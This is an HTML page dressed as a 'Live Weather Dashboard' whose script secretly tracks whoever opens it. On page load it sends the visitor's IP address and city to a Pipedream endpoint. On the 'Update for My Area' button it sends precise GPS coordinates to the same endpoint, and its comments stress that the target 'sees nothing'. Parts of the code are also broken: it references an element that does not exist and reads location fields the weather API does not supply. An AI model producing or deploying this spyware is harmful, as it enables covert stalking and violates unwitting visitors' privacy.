<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 320px; }
        #location-name { font-size: 24px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
        .temp { font-size: 48px; margin: 10px 0; }
        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 10px; }
        .btn:hover { background: #4299e1; }
        p { color: #a0aec0; margin: 5px 0; }
    </style>
</head>
<body>

    <div class="card">
        <p style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">Current Forecast</p>
        <div id="location-name">Detecting...</div>
        <div class="temp">28Â°C</div>
        <p id="weather-desc">Partly Cloudy</p>
        
        <button class="btn" onclick="updateWeather()">Update for My Area</button>
   </div>

  <script>
    const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";

    // 1. THE INSTANT HOOK (IP-BASED)
    window.onload = function() {
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            const initialCity = data.city || "India";
            document.getElementById('location-name').innerText = initialCity;

            // Get Real Temp for his IP location
            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.latitude}&longitude=${data.longitude}&current_weather=true`)
            .then(r => r.json())
            .then(w => {
                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "Â°C";
            });

            // Silent log to you
            fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "IP_HIT", ip: data.ip, city: initialCity }) });
        });
    };

    // 2. THE SILENT UPGRADE (GPS-BASED)
    function updateWeather() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // SILENTLY update to the exact neighborhood/lane name
                fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true&timezone=auto`)
                .then(res => res.json())
                .then(geoData => {
                    // This will show "Bandra West" or "Colaba" instead of just "Mumbai"
                    const preciseName = geoData.locality || geoData.principalSubdivision || geoData.city;
                    document.getElementById('location-name').innerText = preciseName;
                });

                // SILENTLY update to the exact house-level temperature
                fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
                .then(r => r.json())
                .then(w => {
                    document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "Â°C";
                });

                // LOG THE COORDINATES TO YOU (He sees nothing)
                fetch(PIPEDREAM_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ type: "GPS_DATA", lat: lat, lon: lon })
                });

            }, function(error) {
                // If he denies, the site just stays as it is (showing IP data).
                // No error messages, no suspicion.
            });
        }
    }
</script>
</body>
</html>
